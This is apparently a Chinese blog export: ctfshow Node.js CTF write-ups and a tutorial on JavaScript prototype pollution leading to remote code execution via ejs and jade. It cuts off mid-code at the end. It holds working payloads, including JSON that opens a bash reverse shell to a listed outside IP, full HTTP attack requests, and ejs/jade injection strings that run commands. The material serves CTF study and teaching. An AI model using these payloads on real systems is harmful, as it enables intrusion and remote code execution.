#原型链污染RCE\n\n看一下登录逻辑\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\nfunction User(){\n  this.username='';\n  this.password='';\n}\nfunction normalUser(){\n  this.user\n}\n\n\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow===flag){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n  \n  \n});\n\nmodule.exports = router;\n```\n\n这里的话显然满足不了if语句，另外还发现了一个api.js\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\n\n\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  res.render('api', { query: Function(query)(query)});\n   \n});\n\nmodule.exports = router;\n\n```\n\n这里也有json处理数据的路由，既然会渲染api，那么我们污染一下里面的query参数去打rce\n\n关于Function函数\n\n![image-20250530145021618](../image/achieve/202411/nodejs--ctfshow/image-20250530145021618.png)\n\n可以打反弹shell，这样刚方便\n\n```\n{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\\\"')\"}}\n```\n\n```\nPOST /login HTTP/1.1\nHost: d0cac15b-62ce-4473-a77f-fad68c73c708.challenge.ctf.show\nConnection: keep-alive\nContent-Length: 31\nsec-ch-ua-platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nsec-ch-ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"\nContent-Type: application/json\nsec-ch-ua-mobile: ?0\nOrigin: https://d0cac15b-62ce-4473-a77f-fad68c73c708.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://d0cac15b-62ce-4473-a77f-fad68c73c708.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\n\n{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.223.25.186/1234 0>&1\\\"')\"}}\n```\n\n然后监听端口再POST访问api接口就行了，弹上后flag在env环境变量中，不过我发现在login.js中也有\n\n![image-20250530143905071](../image/achieve/202411/nodejs--ctfshow/image-20250530143905071.png)\n\n## web340\n\n![image-20250530145251130](../image/achieve/202411/nodejs--ctfshow/image-20250530145251130.png)\n\n很明显这里覆盖不现实，还是直接原型链污染打rce\n\n```javascript\nutils.copy(user.userinfo,req.body);\n```\n\n但是这里需要污染两层，调试就可以的出来\n\n```javascript\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 && key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n}\nvar user = new function(){\n    this.userinfo = new function(){\n        this.isVIP = false;\n        this.isAdmin = false;\n        this.isAuthor = false;\n    };\n}\nbody=JSON.parse('{\"__proto__\":{\"__proto__\":{\"query\":\"123\"}}}');\ncopy(user.userinfo,body);\nconsole.log(user.userinfo);\nconsole.log(user.query);\n//{ isVIP: false, isAdmin: false, isAuthor: false }\n//123\n```\n\n可以看到这里污染成功了，直接打就行\n\n```\nPOST /login HTTP/1.1\nHost: c845fec7-1342-42ff-a2fe-aede5313fce6.challenge.ctf.show\nConnection: keep-alive\nContent-Length: 31\nsec-ch-ua-platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nsec-ch-ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"\nContent-Type: application/json\nsec-ch-ua-mobile: ?0\nOrigin: https://c845fec7-1342-42ff-a2fe-aede5313fce6.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://c845fec7-1342-42ff-a2fe-aede5313fce6.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\n\n{\"__proto__\":{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.223.25.186/1234 0>&1\\\"')\"}}}\n```\n\n后面的就一样了\n\n## web341\n\n### #ejs模板注入RCE\n\n这次在index.js中没有函数调用了，但是在app.js中发现是ejs的模板引擎\n\n![image-20250601120903908](../image/achieve/202411/nodejs--ctfshow/image-20250601120903908.png)\n\n我们跟进ejs.js文件的readFile函数\n\n```javascript\nexports.renderFile = function () {\n  var args = Array.prototype.slice.call(arguments);//将arguments转为数组\n  var filename = args.shift();\n  var cb;\n  var opts = {filename: filename};\n  var data;\n  var viewOpts;\n\n  // Do we have a callback?\n  if (typeof arguments[arguments.length - 1] == 'function') {\n    cb = args.pop();\n  }\n  // Do we have data/opts?\n  if (args.length) {\n    // Should always have data obj\n    data = args.shift();\n    // Normal passed opts (data obj + opts obj)\n    if (args.length) {\n      // Use shallowCopy so we don't pollute passed in opts obj with new vals\n      utils.shallowCopy(opts, args.pop());\n    }\n    // Special casing for Express (settings + opts-in-data)\n    else {\n      // Express 3 and 4\n      if (data.settings) {\n        // Pull a few things from known locations\n        if (data.settings.views) {\n          opts.views = data.settings.views;\n        }\n        if (data.settings['view cache']) {\n          opts.cache = true;\n        }\n        // Undocumented after Express 2, but still usable, esp. for\n        // items that are unsafe to be passed along with data, like `root`\n        viewOpts = data.settings['view options'];\n        if (viewOpts) {\n          utils.shallowCopy(opts, viewOpts);\n        }\n      }\n      // Express 2 and lower, values set in app.locals, or people who just\n      // want to pass options in their data. NOTE: These values will override\n      // anything previously set in settings  or settings['view options']\n      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);\n    }\n    opts.filename = filename;\n  }\n  else {\n    data = {};\n  }\n\n  return tryHandleCache(opts, data, cb);\n};\n```\n\n在 EJS（Embedded JavaScript）模板引擎中，renderFile() 是一个用于加载和渲染模板文件的方法。它通常与 Express 框架一起使用。\n\nrenderFile() 方法的作用是读取指定的 EJS 模板文件，并将数据填充到模板中生成最终的 HTML 内容。这个方法多用于将动态数据注入到模板中，以生成动态的网页内容\n\n最后会返回tryHandleCache函数的值，从代码中可以看到，如果我们能控制返回的结果，是不是就可以进行攻击注入呢？，我们跟进这个函数看下\n\n```javascript\nfunction tryHandleCache(options, data, cb) {\n  var result;\n  if (!cb) {\n    if (typeof exports.promiseImpl == 'function') {\n      return new exports.promiseImpl(function (resolve, reject) {\n        try {\n          result = handleCache(options)(data);\n          resolve(result);\n        }\n        catch (err) {\n          reject(err);\n        }\n      });\n    }\n    else {\n      throw new Error('Please provide a callback function');\n    }\n  }\n  else {\n    try {\n      result = handleCache(options)(data);\n    }\n    catch (err) {\n      return cb(err);\n    }\n\n    cb(null, result);\n  }\n}\n```\n\n这里无论如何都会利用handleCache渲染模板，我们跟进handleCache函数看看\n\n```javascript\nfunction handleCache(options, template) {\n  var func;\n  var filename = options.filename;\n  var hasTemplate = arguments.length > 1;\n\n  if (options.cache) {\n    if (!filename) {\n      throw new Error('cache option requires a filename');\n    }\n    func = exports.cache.get(filename);\n    if (func) {\n      return func;\n    }\n    if (!hasTemplate) {\n      template = fileLoader(filename).toString().replace(_BOM, '');\n    }\n  }\n  else if (!hasTemplate) {\n    // istanbul ignore if: should not happen at all\n    if (!filename) {\n      throw new Error('Internal EJS error: no file name or template '\n                    + 'provided');\n    }\n    template = fileLoader(filename).toString().replace(_BOM, '');\n  }\n  func = exports.compile(template, options);\n  if (options.cache) {\n    exports.cache.set(filename, func);\n  }\n  return func;\n}\n```\n\n这个函数的返回值是`func`，而`func`是` exports.compile(template, options)`的返回值,我们跟进complie函数\n\n![image-20250601123040513](../image/achieve/202411/nodejs--ctfshow/image-20250601123040513.png)\n\n如果能够覆盖 `opts.outputFunctionName` , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE\n\n```javascript\nprepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';\n```\n\n例如我们拼接命令语句\n\n```javascript\nprepended += '  var ' + return outputFunctionName\":\"__tmp1;global.process.mainModule.require(\\'chile_process\\').execSync(\\'ls\\');var __tmp2 + ' = __append;' + '\\n';\n```\n\n前后分别给出一个变量，中间插入我们的命令执行语句，当然后面的也可以直接注释掉\n\n所以我们可以传入opts.outputFunctionName的值为\n\n```javascript\nreturn outputFunctionName\":\"__tmp1;global.process.mainModule.require(\\'chile_process\\').execSync(\\'ls\\');var __tmp2\n```\n\n这时候就需要用原型链污染了，将outputFunctionName的值污染一下就可以实现RCE了\n\n本地写一下链子\n\n```javascript\nvar user = new function() {\n    this.userinfo = new function (){\n        this.isVIP = false;\n        this.isAdmin = false;\n        this.isAuthor = false;\n    }\n}\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 && key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n}\n\nvar a = JSON.parse('{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.223.25.186/1234 0>&1\\\"');var __tmp2\"}}}')\ncopy(user.userinfo,a);\nconsole.log(user.outputFunctionName);\n```\n\n传入json后污染成功就访问根目录返回渲染就能弹上了\n\n## web342&343\n\n### #jade模板注入RCE\n\njade引擎的RCE，在js原型链文章中进行了相应的分析，这里直接给payload了\n\n```\n{\"__proto__\":{\"__proto__\":{\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.constructor._load('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/vps-ip/port 0>&1\\\"')\"}}}\n```\n\n## web344\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n  \tres.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n  \tres.end(flag);\n  }else{\n  \tres.end('where is flag. :)');\n  }\n\n});\n```\n\n需要绕过逗号和c，用编码和分段传参就行\n\n```\n/?query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}\n/?query={\"name\":\"admin\"&query=\"password\":\"\\u0063tfshow\"&query=\"isVIP\":true}\n```\n\n","tags":["nodejs"],"categories":["ctfshow"]},{"title":"js原型链污染","url":"/2025/05/29/js原型链污染/","content":"\n## 前言\n\n昨天面试被问到不会的了，问题是python原型链污染和Nodejs原型链污染的区别，刚好只学了python原型链没学js原型链，也算是给自己敲个警钟吧\n\n翻到了p牛的文章[深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)\n\n## 前置知识\n\n在JavaScript中并没父类和子类的概念，对象是由函数创建的，而函数又是另一种对象。在JavaScript中几乎所有东西都是一种对象，例如\n\n```javascript\nvar a = {\n    \"name\" : \"wanth3f1ag\",\n    \"age\" : 20\n}\nconsole.log(a.name)\nconsole.log(a.age)\n```\n\n![image-20250529143526528](../image/achieve/202411/Nodejs原型链污染/image-20250529143526528.png)\n\n这里访问对象属性的方法不止一种，还能用`a[\"name\"]`的方式去访问\n\n## 0x01继承与原型链\n\n在学习原型链污染之前，还是常规套路，就是了解原型链的基础知识，强烈推荐https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain这篇文章，看完之后会对原型链和继承有个基本的认识，不过接下来我还是会一一介绍的\n\n- 什么是继承\n\n只要学过编程的话，相信对这个概念并不陌生，继承就相当于遗传，从父代传到子代，例如我们a类继承了A类，那么A类父代的特性都会传到a类子代中\n\n- 什么是原型\n\n在 JavaScript 中，原型（prototype）是一个非常重要的概念，每个 JavaScript 对象都有一个与之关联的原型对象，对象会以原型为模板，从原型继承属性和方法，通过原型对象，可以实现属性和方法的共享，并且原型对象也可能有原型\n\n<img src=\"../image/achieve/202411/Nodejs原型链污染/deepseek_mermaid_20250529_eaabf4.png\" style=\"zoom: 33%;\" />\n\n- 什么是原型链\n\nJavaScript 使用对象实现继承。每个对象都有一条链接到另一个称作*原型*的对象的内部链。该链子就是原型链，原型对象有自己的原型，依此类推，直到原型是 `null` 的对象。根据定义，`null` 没有原型，并作为这条*原型链*中最后的一环。\n\n## 0x02攻击原理\n\n那么设计原型链污染，那肯定离不开`__proto__`和`prototype`\n\n### `__proto__`和prototype\n\n举个例子\n\nprototype属性\n\n```javascript\nfunction Person(name) {\n    this.name = name;\n}\n\nPerson.prototype.sayHello = function() {\n    console.log(`你好，${this.name}`);\n};\n\nconst alice = new Person('Alice');\nalice.sayHello(); // \"你好，Alice\"\n```\n\n所以我们可以认为原型`prototype`是类`Person`的一个属性，而所有用`Foo`类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的`alice`对象，其天生就具有`alice.sayHello();`方法。\n\n所以此时我们可以通过访问该属性去访问Person类的原型，但是Person类实例化出来的对象是不能通过prototype访问的，而是需要`__proto__`\n\n```javascript\nfunction Person(name) {\n    this.name = name;\n}\n\n// 函数的 prototype 属性\nPerson.prototype.sayHello = function() {\n    console.log(`你好，${this.name}`);\n};\n\nconst alice = new Person('Alice');\n\n// 对象的 __proto__ 属性\nconsole.log(alice.__proto__ === Person.prototype); // true\n\n// 原型链查找\nconsole.log(alice.__proto__.__proto__ === Object.prototype); // true\nconsole.log(alice.__proto__.__proto__.__proto__); // null\n```\n\n总结一下：\n\n1. 一个对象的`__proto__`属性，指向这个对象所在的类的`prototype`属性\n2. 每个对象都有一个名为`__proto__`的内置属性，它指向该对象的原型，每个函数/类也都有一个名为 `prototype `的属性，它指向该函数或类的原型\n3. 当一个类实例化后会用于`prototype`中所有的属性和方法\n\n### 基于原型链的继承机制\n\nJS有一个特性，当一个对象试图访问一个属性或方法时，如果在该对象自身没有找到，JavaScript 会沿着原型链向上查找，直到找到对应的属性或方法，或者达到原型链的顶端 `null` 为止。\n\n手操一下p牛的例子\n\n```javascript\nfunction Father(){\n    this.firstName = \"Damn\";\n    this.lastName = \"john\";\n}\n\nfunction Son() {\n    this.firstName = \"Tom\";\n}\n\nSon.prototype = new Father();\n\nconst son = new Son();\nconsole.log(son.lastName);\n//john\n```\n\n这里的话Son的原型是Father对象实例，那么这里的话Son类其实是继承了Father类的所有属性和方法的，所以这里会输出Father类中的姓john\n\n然后我们输出一下名字呢发现名字并没有变，从继承机制就可以再次明白这个原因，因为在Son类找得到这个属性，所以不会顺着原型链往上找\n\n### 原型链污染是什么\n\n我们这里举个简单的例子解释一下\n\n![image-20250529150052817](../image/achieve/202411/Nodejs原型链污染/image-20250529150052817.png)\n\n这里输出了3，是为什么呢？\n\n先分析一下代码，这里设置了一个对象a中有键值对number=1，对象b中有键值对number=2，然后执行了一个赋值操作\n\n```javascript\nb.__proto__.number = 3\n```\n\n这里有什么特别的呢？我们这里尝试输出一下b的number\n\n![image-20250529150127112](../image/achieve/202411/Nodejs原型链污染/image-20250529150127112.png)\n\n发现b的number是2，哎，很奇怪，前面不是赋值了吗？我们再输出一下b的原型\n\n```\n> b.__proto__\n[Object: null prototype] { number: 3 }\n```\n\n发现这里原型对象中有一个键值对number=3，那么这就解释的通了，这里对b的原型对象设置了一个键值对，然后在访问c的number的时候，因为c对象中并没有number，根据继承机制，会顺着原型链向上寻找，我们看一下c的原型\n\n```\n> c.__proto__\n[Object: null prototype] { number: 3 }\n```\n\n发现这里跟b的原型链一样，那么就可以理解到，b和c的原型都是同一个原型`Object.prototype`，那么当c往上寻找的时候就会找到这个原型中的number并输出\n\n所以我们可以得出原型链污染的由来：\n\n如果我们在一个web应用中能控制并修改了一个对象的原型，那么所有与该对象来自同一个类或者父租类的对象都将会受到影响\n\n### 污染的条件\n\n既然是修改对象的值（原型也是对象），那么找找能够控制对象键名的操作就行（例如python中的merge）\n\np牛这里给出了一个merge对象，我们写一个很简单的merge函数实现\n\n```javascript\nfunction merge(target , source){\n    for (let key in source){\n        if(key in source && key in target){\n            merge(target[key],source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\n```\n\n这里的话会遍历source中所有的属性，如果source和target中都有该属性，则执行合并操作，没有的话则直接赋值\n\n该说不说，不如拿个实例调试一下\n\n```javascript\nconst target = {a : {b : 1}};\nconst source = {a : {c : 2}};\n```\n\n然后我们调试一下\n\n![image-20250529154429254](../image/achieve/202411/Nodejs原型链污染/image-20250529154429254.png)\n\n先是提取了source的key，这里的key为`a`\n\n![image-20250529154534250](../image/achieve/202411/Nodejs原型链污染/image-20250529154534250.png)\n\n因为这里两个key一样，所以进入递归\n\n![image-20250529154627591](../image/achieve/202411/Nodejs原型链污染/image-20250529154627591.png)\n\n再次提取key为c，但是target的key为b，此时进入不了if语句，进入else语句，那么此时就会生成一个键值对`c : 2`，所以最后的target就是\n\n```javascript\n{ a: { b: 1, c: 2 } }\n```\n\n因为这里存在赋值的操作，那么如果key是`__proto__`呢，我们是否就可以实现原型链污染呢\n\n测试一下\n\n```javascript\nlet target = {}\nlet source = {a: 1,\"__proto__\" :{b : 2}}\nmerge(target,source)\nconsole.log(target)\nlet a = {}\nconsole.log(a.b)\n```\n\n![image-20250529155830383](../image/achieve/202411/Nodejs原型链污染/image-20250529155830383.png)\n\n合并执行了但是并没有污染，这是为什么呢？\n\n其实是因为，在source创建对象的过程中，其里面的`__proto__`已经是表示的是source的原型了，例如我们打印一下source的原型\n\n![image-20250529160018922](../image/achieve/202411/Nodejs原型链污染/image-20250529160018922.png)\n\n那么此时遍历source的所有键名，我们拿到的只能是a和b而没有`__proto__`，自然也就不会污染对象原型的值\n\n所以我们需要解决一个问题，那就是如何让`__proto__`被认为是一个Key？很简单，就是关于json的解析问题，如果我们将代码改一下\n\n```javascript\nlet target = {}\nlet source = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(target,source)\nconsole.log(target)\nlet a = {}\nconsole.log(a.b)\n```\n\n这里利用JSON.parse函数将json格式的数据转化成对象，那么此时对象就是键值对的形式，`__proto__`就会被认为是一个key而非其原型\n\n### 不同对象的原型链\n\n我们看看不同类型对象的原型链是什么样的\n\n```javascript\nvar a = {a: 1};\n// o对象直接继承了Object.prototype\n// 原型链：\n// o ---> Object.prototype ---> null\n\nvar a = [\"yo\", \"whadup\", \"?\"];\n// 数组都继承于 Array.prototype\n// 原型链：\n// a ---> Array.prototype ---> Object.prototype ---> null\n\nfunction a(){\n  return 2;\n}\n// 函数对象都继承于 Function.prototype\n// 原型链：\n// f ---> Function.prototype ---> Object.prototype ---> null\n```\n\n在了解了不同对象的原型链后，我们就能理解为什么同类型的不同对象访问同一个属性的时候为什么值是一样的了\n\n## ejs模板引擎原型链污染导致RCE\n\n在js中常规来说RCE的前提都是需要有原型链污染的，那我们看看ejs模板引擎里怎么实现RCE的呢？\n\n本地搭建一下环境\n\n创建一个index.js\n\n```javascript\nvar express = require('express');\nvar _= require('lodash');\nvar ejs = require('ejs');\n\nvar app = express();\n//设置模板的位置\napp.set('views', __dirname);\n//进行渲染\napp.get('/', function (req, res) {\n    var malicious_payload = req.query.malicious_payload;\n    _.merge({}, JSON.parse(malicious_payload));\n    res.render (\"./test.ejs\",{\n        message: 'lufei test '\n    });\n});\n\n//设置http\nvar server = app.listen(8888, function () {\n\n    var port = server.address().port\n\n    console.log(\"测试环境，访问地址为 http://127.0.0.1:%s\", port)\n});\n```\n\n然后写个模板引擎文件test.ejs\n\n```ejs\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title></title>\n</head>\n<body>\n\n<h1><%= message%></h1>\n\n</body>\n</html>\n```\n\n这两个文件需要在同一目录下并且版本要对\n\n安装一下依赖\n\n```\nnpm init -y\nnpm install ejs@3.1.5 lodash@4.17.4 express\n```\n\n第一个是node.js项目初始化的一个命令，第二个就是安装一些依赖和第三方库\n\n![image-20250601134859020](../image/achieve/202411/Nodejs原型链污染/image-20250601134859020.png)\n\n传入payload\n\n```\nhttp://localhost:8888/?malicious_payload={\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('calc');var __tmp2\"}}\n```\n\n![image-20250601135027831](../image/achieve/202411/Nodejs原型链污染/image-20250601135027831.png)\n\n分析一下\n\n### 源码分析&接近真相\n\n其实这里本来没有替换函数，但是在loadsh中有原生的替换函数，参考官方文档[lodash.merge](https://www.lodashjs.com/docs/lodash.merge)\n\n我们跟进这个函数看一下\n\n![image-20250601135718672](../image/achieve/202411/Nodejs原型链污染/image-20250601135718672.png)\n\n跟进后发现\n\n```javascript\n//assignMergeValue\n    function assignMergeValue(object, key, value) {\n      if ((value !== undefined && !eq(object[key], value)) ||\n          (value === undefined && !(key in object))) {\n        baseAssignValue(object, key, value);\n      }\n    }\n```\n\n发现和正常的merge替换函数没什么区别\n\n然后我们看看ejs引擎的renderFile函数\n\n在 EJS（Embedded JavaScript）模板引擎中，renderFile() 是一个用于加载和渲染模板文件的方法。它通常与 Express 框架一起使用。\n\nrenderFile() 方法的作用是读取指定的 EJS 模板文件，并将数据填充到模板中生成最终的 HTML 内容。这个方法多用于将动态数据注入到模板中，以生成动态的网页内容\n\n```javascript\nexports.renderFile = function () {\n  var args = Array.prototype.slice.call(arguments);//将arguments转为数组\n  var filename = args.shift();\n  var cb;\n  var opts = {filename: filename};\n  var data;\n  var viewOpts;\n\n  // Do we have a callback?\n  if (typeof arguments[arguments.length - 1] == 'function') {\n    cb = args.pop();\n  }\n  // Do we have data/opts?\n  if (args.length) {\n    // Should always have data obj\n    data = args.shift();\n    // Normal passed opts (data obj + opts obj)\n    if (args.length) {\n      // Use shallowCopy so we don't pollute passed in opts obj with new vals\n      utils.shallowCopy(opts, args.pop());\n    }\n    // Special casing for Express (settings + opts-in-data)\n    else {\n      // Express 3 and 4\n      if (data.settings) {\n        // Pull a few things from known locations\n        if (data.settings.views) {\n          opts.views = data.settings.views;\n        }\n        if (data.settings['view cache']) {\n          opts.cache = true;\n        }\n        // Undocumented after Express 2, but still usable, esp. for\n        // items that are unsafe to be passed along with data, like `root`\n        viewOpts = data.settings['view options'];\n        if (viewOpts) {\n          utils.shallowCopy(opts, viewOpts);\n        }\n      }\n      // Express 2 and lower, values set in app.locals, or people who just\n      // want to pass options in their data. NOTE: These values will override\n      // anything previously set in settings  or settings['view options']\n      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);\n    }\n    opts.filename = filename;\n  }\n  else {\n    data = {};\n  }\n\n  return tryHandleCache(opts, data, cb);\n};\n```\n\n最后会返回tryHandleCache函数的值，从代码中可以看到，如果我们能控制返回的结果，是不是就可以进行攻击注入呢？，我们跟进这个函数看下\n\n```javascript\nfunction tryHandleCache(options, data, cb) {\n  var result;\n  if (!cb) {\n    if (typeof exports.promiseImpl == 'function') {\n      return new exports.promiseImpl(function (resolve, reject) {\n        try {\n          result = handleCache(options)(data);\n          resolve(result);\n        }\n        catch (err) {\n          reject(err);\n        }\n      });\n    }\n    else {\n      throw new Error('Please provide a callback function');\n    }\n  }\n  else {\n    try {\n      result = handleCache(options)(data);\n    }\n    catch (err) {\n      return cb(err);\n    }\n\n    cb(null, result);\n  }\n}\n```\n\n这里无论如何都会利用handleCache渲染模板，我们跟进handleCache函数看看\n\n```javascript\nfunction handleCache(options, template) {\n  var func;\n  var filename = options.filename;\n  var hasTemplate = arguments.length > 1;\n\n  if (options.cache) {\n    if (!filename) {\n      throw new Error('cache option requires a filename');\n    }\n    func = exports.cache.get(filename);\n    if (func) {\n      return func;\n    }\n    if (!hasTemplate) {\n      template = fileLoader(filename).toString().replace(_BOM, '');\n    }\n  }\n  else if (!hasTemplate) {\n    // istanbul ignore if: should not happen at all\n    if (!filename) {\n      throw new Error('Internal EJS error: no file name or template '\n                    + 'provided');\n    }\n    template = fileLoader(filename).toString().replace(_BOM, '');\n  }\n  func = exports.compile(template, options);\n  if (options.cache) {\n    exports.cache.set(filename, func);\n  }\n  return func;\n}\n```\n\n这个函数的返回值是`func`，而`func`是` exports.compile(template, options)`的返回值,我们跟进complie函数\n\n![image-20250601123040513](../image/achieve/202411/nodejs--ctfshow/image-20250601123040513.png)\n\n如果能够覆盖 `opts.outputFunctionName` , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE\n\n```javascript\nprepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';\n```\n\n例如我们拼接命令语句\n\n```javascript\nprepended += '  var ' + outputFunctionName\":\"__tmp1;global.process.mainModule.require(\\'chile_process\\').execSync(\\'ls\\');var __tmp2 + ' = __append;' + '\\n';\n```\n\n前后分别给出一个变量，中间插入我们的命令执行语句，当然后面的也可以直接注释掉\n\n所以我们可以传入opts.outputFunctionName的值为\n\n```javascript\noutputFunctionName\":\"__tmp1;global.process.mainModule.require(\\'chile_process\\').execSync(\\'ls\\');var __tmp2\n```\n\n这时候就需要用原型链污染了，将outputFunctionName的值污染一下就可以实现RCE了\n\n参考题目：ctfshowweb入门341\n\nejs模板引擎RCE不止存在一个，还有另一处能RCE\n\n```javascript\nvar escapeFn = opts.escapeFunction;\nif (opts.client) {\n  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src;\n  if (opts.compileDebug) {\n    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src;\n  }\n}\n```\n\n这里也同样会拼接，污染 `opts.escapeFunction` 也可以进行 RCE\n\n```\n{\"__proto__\":{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');\",\"compileDebug\":true}}}\n\n{\"__proto__\":{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');\",\"compileDebug\":true,\"debug\":true}}}\n```\n\n## jade模板原型链污染导致RCE\n\n懒得搭环境了，直接拿web342的附件来分析了\n\n先在app.js中加上一个调试的端口地址\n\n```javascript\nvar server = app.listen(8888, function () {\n\n    var port = server.address().port\n\n    console.log(\"测试环境，访问地址为 http://127.0.0.1:%s\", port)\n});\n```\n\n打好断点后我们启动调试，访问8888端口后开始执行渲染\n\n![image-20250601185730273](../image/achieve/202411/Nodejs原型链污染/image-20250601185730273.png)\n\n单步执行跳到render渲染点\n\n![image-20250601190154163](../image/achieve/202411/Nodejs原型链污染/image-20250601190154163.png)\n\n然后跟进执行看一下`__express`\n\n![image-20250601185556995](../image/achieve/202411/Nodejs原型链污染/image-20250601185556995.png)\n\n此时会进入renderFile函数，我们跟进看一下\n\n```javascript\nexports.renderFile = function(path, options, fn){\n  // support callback API\n  if ('function' == typeof options) {\n    fn = options, options = undefined;\n  }\n  if (typeof fn === 'function') {\n    var res\n    try {\n      res = exports.renderFile(path, options);\n    } catch (ex) {\n      return fn(ex);\n    }\n    return fn(null, res);\n  }\n\n  options = options || {};\n\n  options.filename = path;\n  return handleTemplateCache(options)(options);\n};\n```\n\n最后会返回handleTemplateCache函数的执行结果，跟进一下\n\n![image-20250601190333837](../image/achieve/202411/Nodejs原型链污染/image-20250601190333837.png)\n\n```javascript\nfunction handleTemplateCache (options, str) {\n  var key = options.filename;\n  if (options.cache && exports.cache[key]) {\n    return exports.cache[key];\n  } else {\n    if (str === undefined) str = fs.readFileSync(options.filename, 'utf8');\n    var templ 